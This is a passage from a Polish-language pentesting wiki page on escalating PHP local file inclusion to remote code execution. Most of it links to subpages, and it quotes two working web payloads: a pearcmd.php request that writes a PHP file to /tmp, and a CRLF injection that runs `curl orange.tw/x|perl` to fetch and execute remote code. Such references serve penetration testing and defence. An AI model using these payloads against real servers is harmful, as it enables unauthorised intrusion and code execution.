This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) wyjaśnia, że możesz użyć **php filters to generate arbitrary content** jako wynik. Co w praktyce oznacza, że możesz **generate arbitrary php code** dla include **bez potrzeby zapisu** go do pliku.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Przez segmentation fault

**Wyślij** plik, który zostanie zapisany jako **temporary** w `/tmp`, następnie w **tym samym żądaniu** wywołaj **segmentation fault**, a wtedy **plik tymczasowy nie zostanie usunięty** i możesz go odnaleźć.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Przez Nginx temp file storage

Jeśli znalazłeś **Local File Inclusion** i **Nginx** działa przed PHP, możesz być w stanie uzyskać RCE za pomocą następującej techniki:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Przez PHP_SESSION_UPLOAD_PROGRESS

Jeśli znalazłeś **Local File Inclusion** nawet jeśli **nie masz sesji** i `session.auto_start` jest `Off`. Jeśli dostarczysz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP **włączy sesję za Ciebie**. Możesz to nadużyć, aby uzyskać RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Przez temp file uploads in Windows

Jeśli znalazłeś **Local File Inclusion**, a serwer działa na **Windows**, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Przez `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skrypt `/usr/local/lib/phppearcmd.php` istnieje domyślnie w php docker images. Co więcej, możliwe jest przekazanie argumentów do skryptu przez URL, ponieważ wskazano, że jeśli parametr URL nie ma `=`, powinien być użyty jako argument. Zobacz także [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) i [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Poniższe wykorzystuje podatność CRLF do uzyskania RCE (z [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Przez phpinfo() (file_uploads = on)

Jeśli znalazłeś **Local File Inclusion** i plik ujawniający **phpinfo()** z file_uploads = on, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Przez compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Jeśli znalazłeś **Local File Inclusion** i możesz **exfiltrate the path** pliku tymczasowego, ALE **server** **checking**, czy **file to be included has PHP marks**, możesz spróbować **bypass that check** używając tej **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Przez eternal waiting + bruteforce

Jeśli możesz wykorzystać LFI do **upload temporary files** i sprawić, że **server** **hang** wykonanie PHP, możesz wtedy przez wiele godzin **brute force filenames** żeby znaleźć plik tymczasowy:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Jeśli dołączysz którykolwiek z plików `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz dołączyć ten sam plik 2 razy, aby wywołać ten błąd).

**Nie wiem, jak to może być przydatne, ale może być.**\
_Nawet jeśli spowodujesz PHP Fatal Error, przesłane tymczasowe pliki PHP zostaną usunięte._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
